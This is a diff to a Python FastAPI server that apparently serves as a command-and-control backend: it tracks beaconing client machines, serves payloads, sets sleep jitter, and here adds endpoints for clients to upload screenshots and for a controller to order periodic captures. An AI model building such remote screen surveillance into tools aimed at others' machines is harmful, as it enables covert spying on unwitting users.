@@ -1,6 +1,7 @@
 from typing import Dict, List, Optional
 import os
 import uuid
+import base64
 from tinydb import TinyDB, Query
 from pydantic import BaseModel
 import time
@@ -30,6 +31,16 @@ machines_map: Dict[str, str] = {}
 clients_status: Dict[str, Dict[str, Optional[float]]] = {}
 # results per machine (machine_id -> list of result dicts)
 results_store: Dict[str, List[dict]] = {}
+# screenshots per machine (machine_id -> list[dict])
+# we keep a list so we can store multiple screenshots per machine
+screenshots_store: Dict[str, List[dict]] = {}
+# per-machine configuration (e.g. max screenshots to retain)
+machine_configs: Dict[str, Dict[str, int]] = {}
+
+# default maximum number of screenshots to keep per machine
+DEFAULT_MAX_SCREEN_IMAGES = 20
+DEFAULT_MIN_SLEEP = 5
+DEFAULT_MAX_SLEEP = 60
 
 # ensure data dir exists and open a TinyDB database for persistent results
 DB_PATH = os.path.join(os.path.dirname(__file__), "data")
@@ -38,10 +49,65 @@ DB_FILE = os.path.join(DB_PATH, "db.json")
 db = TinyDB(DB_FILE)
 results_table = db.table("results")
 payloads_table = db.table("payloads")
+machine_configs_table = db.table("machine_configs")
 
 # ensure payloads directory for serving files
 PAYLOADS_PATH = os.path.join(os.path.dirname(__file__), "payloads")
 os.makedirs(PAYLOADS_PATH, exist_ok=True)
+
+# ensure screenshots directory
+SCREENSHOTS_PATH = os.path.join(os.path.dirname(__file__), "screenshots")
+os.makedirs(SCREENSHOTS_PATH, exist_ok=True)
+
+
+@app.on_event("startup")
+def load_existing_screenshots():
+    """On server startup, scan the screenshots directory and populate screenshots_store
+    with any PNG files found. This allows the UI to show older screenshots across restarts.
+    """
+    try:
+        for mid in os.listdir(SCREENSHOTS_PATH):
+            machine_dir = os.path.join(SCREENSHOTS_PATH, mid)
+            if not os.path.isdir(machine_dir):
+                continue
+            entries = []
+            for fname in sorted(os.listdir(machine_dir)):
+                if not fname.lower().endswith('.png'):
+                    continue
+                path = os.path.join(machine_dir, fname)
+                try:
+                    with open(path, 'rb') as f:
+                        data = f.read()
+                    img_b64 = base64.b64encode(data).decode('ascii')
+                    rec_id = os.path.splitext(fname)[0]
+                    ts = os.path.getmtime(path)
+                    rec = {"id": rec_id, "task_id": None, "machine_id": mid, "timestamp": ts, "path": path, "image_b64": img_b64}
+                    entries.append(rec)
+                except Exception:
+                    continue
+            if entries:
+                # ensure sorted by timestamp (oldest first)
+                entries.sort(key=lambda r: r.get('timestamp', 0))
+                screenshots_store[mid] = entries
+    except Exception:
+        # don't crash startup if filesystem access fails
+        pass
+
+    # load persisted machine configs from TinyDB so settings survive restarts
+    try:
+        for rec in machine_configs_table.all():
+            mid = rec.get('machine_id')
+            if not mid:
+                continue
+            machine_configs.setdefault(mid, {})
+            if 'max_screen_images' in rec:
+                machine_configs[mid]['max_screen_images'] = rec.get('max_screen_images')
+            if 'min_sleep' in rec:
+                machine_configs[mid]['min_sleep'] = rec.get('min_sleep')
+            if 'max_sleep' in rec:
+                machine_configs[mid]['max_sleep'] = rec.get('max_sleep')
+    except Exception:
+        pass
 
 
 @app.get("/")
@@ -127,7 +193,15 @@ def status_update(machine_id: str, sleeping_for: Optional[float] = None):
     # mark if there are any pending tasks for convenience
     clients_status[machine_id]["has_task"] = bool(tasks_store.get(machine_id))
 
-    return {"status": "updated", "machine_id": machine_id, "status_info": clients_status[machine_id]}
+    # if the controller has requested periodic screenshots for this machine,
+    # when the client reports a sleep interval we may ask it to take a screenshot
+    # after waking. Return a small boolean to instruct the client.
+    screenshot_after_sleep = False
+    if sleeping_for is not None:
+        if clients_status[machine_id].get("periodic_screenshots"):
+            screenshot_after_sleep = True
+
+    return {"status": "updated", "machine_id": machine_id, "status_info": clients_status[machine_id], "screenshot_after_sleep": screenshot_after_sleep}
 
 
 @app.get("/clients_status")
@@ -243,6 +317,185 @@ def get_payload(file_name: str):
         return {"content": None}
     with open(path, "r", encoding="utf-8") as f:
         return {"content": f.read(), "file_name": safe_name}
+
+
+class UploadScreenshot(BaseModel):
+    machine_id: str
+    task_id: Optional[str]
+    image_b64: str
+
+
+@app.post("/upload_screenshot")
+def upload_screenshot(payload: UploadScreenshot):
+    """Accept a base64-encoded PNG screenshot from a client and store it as the latest screenshot for that machine."""
+    mid = payload.machine_id
+    tid = payload.task_id
+    b64 = payload.image_b64
+    now = time.time()
+    rec_id = str(uuid.uuid4())
+    # save to disk
+    try:
+        import base64
+        data = base64.b64decode(b64)
+        # save per-machine folder so screenshots are grouped by machine
+        machine_dir = os.path.join(SCREENSHOTS_PATH, mid)
+        os.makedirs(machine_dir, exist_ok=True)
+        path = os.path.join(machine_dir, f"{rec_id}.png")
+        with open(path, "wb") as f:
+            f.write(data)
+    except Exception as e:
+        return {"status": "error", "reason": str(e)}
+
+    rec = {"id": rec_id, "task_id": tid, "machine_id": mid, "timestamp": now, "path": path, "image_b64": b64}
+    screenshots_store.setdefault(mid, []).append(rec)
+
+    # enforce per-machine retention policy (prune oldest screenshots when over limit)
+    cfg = machine_configs.get(mid, {})
+    limit = cfg.get('max_screen_images', DEFAULT_MAX_SCREEN_IMAGES)
+    lst = screenshots_store.get(mid, [])
+    if limit is not None and len(lst) > limit:
+        # remove oldest entries (from the front)
+        remove_count = len(lst) - limit
+        to_remove = lst[:remove_count]
+        remaining = lst[remove_count:]
+        # delete files for removed screenshots
+        for r in to_remove:
+            try:
+                p = r.get('path')
+                if p and os.path.exists(p):
+                    os.remove(p)
+            except Exception:
+                pass
+        screenshots_store[mid] = remaining
+    return {"status": "uploaded", "screenshot": {"id": rec_id, "timestamp": now}}
+
+
+@app.get("/screenshot")
+def get_screenshot(machine_id: str):
+    """Return the latest screenshot for a machine (if any)."""
+    lst = screenshots_store.get(machine_id) or []
+    if not lst:
+        return {"screenshot": None}
+    # latest is the last appended
+    rec = lst[-1]
+    return {"screenshot": {"id": rec.get("id"), "task_id": rec.get("task_id"), "machine_id": rec.get("machine_id"), "timestamp": rec.get("timestamp"), "image_b64": rec.get("image_b64")}}
+
+
+@app.get("/screenshots")
+def list_screenshots(machine_id: str):
+    """Return list of stored screenshots metadata for a machine (most recent last)."""
+    lst = screenshots_store.get(machine_id) or []
+    # return metadata including the base64 image so the UI can render thumbnails
+    out = [{"id": r.get("id"), "task_id": r.get("task_id"), "timestamp": r.get("timestamp"), "path": r.get("path"), "image_b64": r.get('image_b64')} for r in lst]
+    return {"screenshots": out}
+
+
+@app.delete("/screenshot")
+def delete_screenshot(id: str):
+    """Delete a screenshot by its unique id from memory and disk."""
+    found = None
+    found_mid = None
+    for mid, lst in list(screenshots_store.items()):
+        for r in lst:
+            if r.get('id') == id:
+                found = r
+                found_mid = mid
+                break
+        if found:
+            break
+    if not found:
+        return {"deleted": False, "reason": "not_found"}
+    # remove file if present
+    try:
+        p = found.get('path')
+        if p and os.path.exists(p):
+            os.remove(p)
+    except Exception:
+        pass
+    # remove from in-memory list
+    if found_mid:
+        screenshots_store[found_mid] = [r for r in screenshots_store.get(found_mid, []) if r.get('id') != id]
+        if not screenshots_store[found_mid]:
+            del screenshots_store[found_mid]
+    return {"deleted": True, "id": id}
+
+
+@app.post("/toggle_periodic_screenshots")
+def toggle_periodic_screenshots(machine_id: str, enabled: bool = True):
+    """Controller API to enable/disable periodic screenshots for a given machine.
+
+    When enabled, the server will instruct clients (via the `status_update` response)
+    to take a screenshot after their next sleep interval.
+    """
+    if machine_id not in clients_status:
+        clients_status.setdefault(machine_id, {})
+    clients_status[machine_id]["periodic_screenshots"] = bool(enabled)
+    return {"status": "ok", "machine_id": machine_id, "periodic_screenshots": clients_status[machine_id]["periodic_screenshots"]}
+
+
+class MachineConfig(BaseModel):
+    machine_id: str
+    max_screen_images: Optional[int] = None
+    min_sleep: Optional[float] = None
+    max_sleep: Optional[float] = None
+
+
+@app.post("/set_machine_config")
+def set_machine_config(cfg: MachineConfig):
+    """Set per-machine configuration such as `max_screen_images`.
+
+    If `max_screen_images` is None the setting is left unchanged.
+    """
+    mid = cfg.machine_id
+    machine_configs.setdefault(mid, {})
+    updated = False
+    # update in-memory config
+    if cfg.max_screen_images is not None:
+        try:
+            val = int(cfg.max_screen_images)
+            machine_configs[mid]['max_screen_images'] = max(0, val)
+            updated = True
+        except Exception:
+            pass
+    if cfg.min_sleep is not None:
+        try:
+            ms = float(cfg.min_sleep)
+            machine_configs[mid]['min_sleep'] = max(0.0, ms)
+            updated = True
+        except Exception:
+            pass
+    if cfg.max_sleep is not None:
+        try:
+            ms = float(cfg.max_sleep)
+            machine_configs[mid]['max_sleep'] = max(0.0, ms)
+            updated = True
+        except Exception:
+            pass
+
+    # persist to TinyDB (merge with existing record)
+    try:
+        q = Query()
+        existing = machine_configs_table.search(q.machine_id == mid)
+        rec = existing[0] if existing else {"machine_id": mid}
+        # merge values
+        if 'max_screen_images' in machine_configs[mid]:
+            rec['max_screen_images'] = machine_configs[mid]['max_screen_images']
+        if 'min_sleep' in machine_configs[mid]:
+            rec['min_sleep'] = machine_configs[mid]['min_sleep']
+        if 'max_sleep' in machine_configs[mid]:
+            rec['max_sleep'] = machine_configs[mid]['max_sleep']
+        machine_configs_table.upsert(rec, q.machine_id == mid)
+    except Exception:
+        pass
+
+    return {"status": "ok", "machine_id": mid, "config": machine_configs.get(mid, {})}
+
+
+@app.get("/machine_config")
+def get_machine_config(machine_id: str):
+    """Return current per-machine config (with defaults applied)."""
+    cfg = machine_configs.get(machine_id, {})
+    return {"machine_id": machine_id, "config": {"max_screen_images": cfg.get('max_screen_images', DEFAULT_MAX_SCREEN_IMAGES), "min_sleep": cfg.get('min_sleep', DEFAULT_MIN_SLEEP), "max_sleep": cfg.get('max_sleep', DEFAULT_MAX_SLEEP)}}
 
 
 @app.get("/tasks")
